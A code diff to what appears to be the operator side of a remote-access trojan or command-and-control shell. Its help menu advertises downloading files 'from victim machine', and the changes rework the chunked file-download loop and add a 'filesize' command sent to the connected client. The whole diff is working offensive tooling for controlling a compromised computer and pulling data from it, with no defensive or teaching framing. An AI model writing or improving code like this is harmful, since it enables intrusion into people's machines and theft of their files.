@@ -245,7 +245,7 @@ class HelpCenter():
         Returns:
             str: The Help Content
         """
-        return f"Shell Module Help Menu:\n     - {Fore.BLUE}help{Style.RESET_ALL}: Shows this help menu\n     - {Fore.BLUE}download{Style.RESET_ALL}: Download files from victim machine\n     - {Fore.BLUE}exit{Style.RESET_ALL}: Exits the shell\n"
+        return f"Shell Module Help Menu:\n     - {Fore.BLUE}help{Style.RESET_ALL}: Shows this help menu\n     - {Fore.BLUE}download{Fore.RED}[FILE NAME]{Style.RESET_ALL}: Download files from victim machine\n     - {Fore.BLUE}filesize {Fore.RED}[FILE NAME]{Style.RESET_ALL}: Shows the Size of a File on Client Machine\n     - {Fore.BLUE}exit{Style.RESET_ALL}: Exits the shell\n"
 
 class Commands():
     def sysinfo(self, data: bytes) -> None:
@@ -297,28 +297,27 @@ class Commands():
             # Save the File
             with open(os.path.join(dirname, filename[9:]), 'wb') as file:
                 print("Downloading File...")
-                # Get File Data
-                data = conn.recv(1024)
-                conn.settimeout(1)
+                conn.recv(1024)
 
-                # Write the Data to the File
-                counter = 0
-                count = 0
-                while data:
+                # Set the buffer size
+                buffSize = 1024
+                conn.send(str.encode(str(buffSize)))
+
+                # Loop to get all the data
+                while True:
                     try:
-                        if count == 0:
-                            file.write(data)
-                        count = 0
-                        data = conn.recv(1024)
-                    except socket.timeout as e:
-                        counter += 1
-                        count += 1
-                        if counter > 1:
+                        # Ask for Data
+                        section = conn.recv(buffSize)
+                        # Save the Data
+                        if len(section) == buffSize:
+                            file.write(section)
+                            conn.send(str.encode("Next"))
+                        else:
+                            file.write(section)
                             break
-
-                # Reset the File
-                conn.settimeout(None)
-                file.close()
+                    except Exception as e:
+                        print(e)
+            file.close()
         
 class CommandCenter(Commands, HelpCenter):
     def __init__(self, sock: socket.socket) -> None:
@@ -364,6 +363,9 @@ class CommandCenter(Commands, HelpCenter):
                             if command == 'exit':
                                 self.conn.send(str.encode(command))
                                 break
+                            elif command[:9] == 'filesize ':
+                                self.conn.send(str.encode(command))
+                                print(self.conn.recv(1024).decode())
                             elif command[:9] == 'download ':
                                 self.conn.send(str.encode(command))
                                 self.Shell().download(command, self.conn)
